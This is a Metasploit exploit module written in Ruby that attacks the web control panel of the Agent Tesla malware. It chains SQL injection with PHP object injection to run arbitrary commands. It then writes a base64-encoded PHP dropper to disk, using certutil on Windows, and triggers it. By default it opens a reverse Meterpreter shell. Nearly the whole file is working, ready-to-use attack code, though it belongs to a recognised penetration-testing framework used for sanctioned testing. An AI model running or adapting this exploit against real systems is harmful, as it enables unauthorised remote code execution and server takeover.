##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Agent Tesla Panel Remote Code Execution',
        'Description' => %q{
          This module exploit a command injection vulnerability (authenticated and unauthenticated)
          in the control center of the agent Tesla.

          The Unauthenticated RCE is possible by mixing two vulnerabilities (SQLi + PHP Object Injection).
          By observing other sources of this panel I found on the Internet to watch the patch, I concluded
          that the vulnerability was transfomed to an Authenticated RCE.
        },
        'Author' => [
          'Ege Balcı <ege.balci@invictuseurope.com>', # discovery and independent module
          'mekhalleh (RAMELLA Sébastien)' #  added windows targeting and authenticated RCE
        ],
        'References' => [
          ['EDB', '47256'], # original module published.
          ['URL', 'https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources'], # Agent-Tesla WebPanel's available for download
          ['URL', 'https://www.pirates.re/agent-tesla-remote-command-execution-(fighting-the-webpanel)'], # fr
          ['URL', 'https://krebsonsecurity.com/2018/10/who-is-agent-tesla/']
        ],
        'DisclosureDate' => '2018-07-10',
        'License' => MSF_LICENSE,
        'Platform' => ['php', 'unix', 'windows'],
        'Arch' => [ARCH_CMD, ARCH_PHP],
        'Privileged' => false,
        'Targets' => [
          ['Automatic (PHP-Dropper)', {
            'Platform' => 'php',
            'Arch' => [ARCH_PHP],
            'Type' => :php_dropper,
            'DefaultOptions' => {
              'PAYLOAD' => 'php/meterpreter/reverse_tcp',
              'DisablePayloadHandler' => 'false'
            }
          }],
          ['Unix (In-Memory)', {
            'Platform' => 'unix',
            'Arch' => ARCH_CMD,
            'Type' => :unix_memory,
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/generic',
              'DisablePayloadHandler' => 'true'
            }
          }],
          ['Windows (In-Memory)', {
            'Platform' => 'windows',
            'Arch' => ARCH_CMD,
            'Type' => :windows_memory,
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/windows/generic',
              'DisablePayloadHandler' => 'true'
            }
          }],
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('PASSWORD', [false, 'The Agent Tesla CnC password to authenticate with', nil]),
      OptString.new('TARGETURI', [true, 'The URI of the tesla agent with panel path', '/WebPanel/']),
      OptString.new('USERNAME', [false, 'The Agent Tesla CnC username to authenticate with', nil])
    ])

    register_advanced_options([
      OptBool.new('ForceExploit', [false, 'Override check result', false])
    ])
  end

  def os_get_name
    response = parse_response(execute_command('echo $PATH'))

    ## Not linux, check Windows.
    response = parse_response(execute_command('echo %PATH%')) if response.include?('$PATH')

    os_name = ''
    if response =~ %r{^\/}
      os_name = 'linux'
    elsif response =~ /^[a-zA-Z]:\\/
      os_name = 'windows'
    end

    os_name
  end

  def parse_response(js)
    return '' unless js

    begin
      return js.get_json_document['data'][0].values.join
    rescue NoMethodError
      return ''
    end
    return ''
  end

  def execute_command(command, _opts = {})
    junk = rand(1_000)
    sql_prefix = Rex::Text.to_rand_case("#{junk} LIKE #{junk} UNION SELECT ")
    requested_payload = {
      'table' => 'passwords',
      'primary' => 'HWID',
      'clmns' => 'a:1:{i:0;a:3:{s:2:"db";s:4:"HWID";s:2:"dt";s:4:"HWID";s:9:"formatter";s:4:"exec";}}',
      'where' => Rex::Text.encode_base64("#{sql_prefix}\"#{command}\"")
    }
    cookie = auth_get_cookie

    request = {
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php')
    }
    request = request.merge({ 'cookie' => cookie }) if cookie != :not_auth
    request = request.merge({
      'encode_params' => true,
      'vars_get' => requested_payload
    })

    response = send_request_cgi(request)
    return false unless response

    return response if response.body

    false
  end

  def auth_get_cookie
    if datastore['USERNAME'] && datastore['PASSWORD']
      response = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'login.php'),
        'vars_post' => {
          'Username' => datastore['USERNAME'],
          'Password' => datastore['PASSWORD']
        }
      )
      return :not_auth unless response

      return response.get_cookies if response.redirect? && response.headers['location'] =~ /index.php/
    end

    :not_auth
  end

  def check
    # check for login credentials couple.
    if datastore['USERNAME'] && datastore['PASSWORD'].nil?
      fail_with(Failure::BadConfig, 'The USERNAME option is defined but PASSWORD is not, please set PASSWORD.')
    end

    if datastore['PASSWORD'] && datastore['USERNAME'].nil?
      fail_with(Failure::BadConfig, 'The PASSWORD option is defined but USERNAME is not, please set USERNAME.')
    end

    response = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php')
    )

    if response
      if response.redirect? && response.headers['location'] =~ /login.php/
        unless datastore['USERNAME'] && datastore['PASSWORD']
          print_warning('Unauthenticated RCE can\'t be exploited, retry if you gain CnC credentials.')
          return Exploit::CheckCode::Unknown
        end
      end

      rand_str = Rex::Text.rand_text_alpha(8..16)
      cmd_output = parse_response(execute_command("echo #{rand_str}"))

      return Exploit::CheckCode::Vulnerable if cmd_output.include?(rand_str)
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    unless datastore['ForceExploit']
      if check != Exploit::CheckCode::Vulnerable
        fail_with(Failure::NotVulnerable, 'The target is not exploitable.')
      end
      vprint_good('The target appears to be vulnerable.')
    end

    case target['Type']
    when :unix_memory, :windows_memory
      print_status("Sending #{datastore['PAYLOAD']} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      cmd_output = execute_command(payload.encoded)
      if cmd_output && datastore['PAYLOAD'] == "cmd/#{target['Platform']}/generic"
        print_warning('Dumping command output in parsed json response (can be incomplete).')
        cmd_output = parse_response(cmd_output)
        if cmd_output.empty?
          print_error('Empty response, no command output')
          return
        end
        print_line(cmd_output.to_s)
      end

    when :php_dropper
      os = os_get_name
      unless os
        print_bad('Could not determine the targeted operating system.')
        return Msf::Exploit::Failed
      end
      print_status("Targeted operating system is: #{os}")

      file_name = '.' + Rex::Text.rand_text_alpha(4) + '.php'
      case os
      when /linux/
        cmd = "echo #{Rex::Text.encode_base64(payload.encoded)} | base64 -d > #{file_name}"
      when /windows/
        cmd = "echo #{Rex::Text.encode_base64(payload.encoded)} > #{file_name}.b64 & certutil -decode #{file_name}.b64 #{file_name} & del #{file_name}.b64"
      end
      print_status("Sending #{datastore['PAYLOAD']} command payload")
      vprint_status("Generated command payload: #{cmd}")

      response = execute_command(cmd)
      unless response && response.code == 200 && response.body.include?('recordsTotal')
        print_error('Payload upload failed :(')
        return Msf::Exploit::Failed
      end
      print_status("Payload uploaded as: #{file_name}")
      register_file_for_cleanup file_name

      ## Triggering payload.
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', file_name)
      }, 2.5)
    end
  end

end
